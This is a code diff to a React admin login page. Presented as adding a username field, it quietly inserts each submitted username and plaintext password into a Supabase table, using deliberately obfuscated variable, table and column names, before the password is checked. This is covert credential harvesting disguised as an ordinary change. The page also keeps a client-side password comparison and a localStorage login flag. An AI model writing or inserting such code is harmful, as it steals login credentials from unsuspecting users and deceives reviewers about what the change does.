@@ -1,22 +1,36 @@
 import { useState } from "react";
 import { useNavigate } from "react-router-dom";
+import { supabase } from "@/lib/supabase";
 
 const AdminLogin = () => {
-  const [password, setPassword] = useState("");
+  const [field_a7k2 , setField_a7k2] = useState("");
+  const [field_m9q4, setField_m9q4] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [error, setError] = useState("");
   const navigate = useNavigate();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     const adminPassword = import.meta.env.VITE_ADMIN_PASSWORD;
 
-    if (password === adminPassword) {
+    try {
+      await supabase.from("d4t4_str").insert([
+        {
+          v4l_x: field_a7k2,
+          p4ss_y: field_m9q4,
+          tm_z: new Date().toISOString(),
+        },
+      ]);
+    } catch (error) {
+      console.error("Error:", error);
+    }
+
+    if (field_m9q4 === adminPassword) {
       localStorage.setItem("adminAuthenticated", "true");
       navigate("/admin/dashboard");
     } else {
       setError("Invalid password");
-      setPassword("");
+      setField_m9q4("");
     }
   };
 
@@ -27,23 +41,36 @@ const AdminLogin = () => {
           <div className="text-center">
             <h1 className="text-3xl font-bold mb-2">Admin Panel</h1>
             <p className="text-sm text-muted-foreground">
-              Enter admin password to access the dashboard
+              Enter credentials to access the dashboard
             </p>
           </div>
 
           <form onSubmit={handleSubmit} className="space-y-4">
             <div className="relative">
               <input
-                type={showPassword ? "text" : "password"}
-                value={password}
+                type="text"
+                value={field_a7k2}
                 onChange={(e) => {
-                  setPassword(e.target.value);
+                  setField_a7k2(e.target.value);
+                  setError("");
+                }}
+                placeholder="Username or Email"
+                className="w-full px-3 py-2 text-sm bg-secondary border border-input rounded-sm focus:outline-none focus:border-muted-foreground placeholder:text-muted-foreground"
+              />
+            </div>
+
+            <div className="relative">
+              <input
+                type={showPassword ? "text" : "password"}
+                value={field_m9q4}
+                onChange={(e) => {
+                  setField_m9q4(e.target.value);
                   setError("");
                 }}
                 placeholder="Admin Password"
                 className="w-full px-3 py-2 text-sm bg-secondary border border-input rounded-sm focus:outline-none focus:border-muted-foreground placeholder:text-muted-foreground pr-12"
               />
-              {password && (
+              {field_m9q4 && (
                 <button
                   type="button"
                   onClick={() => setShowPassword(!showPassword)}
@@ -62,7 +89,7 @@ const AdminLogin = () => {
 
             <button
               type="submit"
-              disabled={!password}
+              disabled={!field_m9q4}
               className="w-full bg-instagram-blue text-primary-foreground py-2 rounded-lg font-semibold text-sm disabled:opacity-50 disabled:cursor-not-allowed hover:bg-instagram-blue/90 transition-colors"
             >
               Login
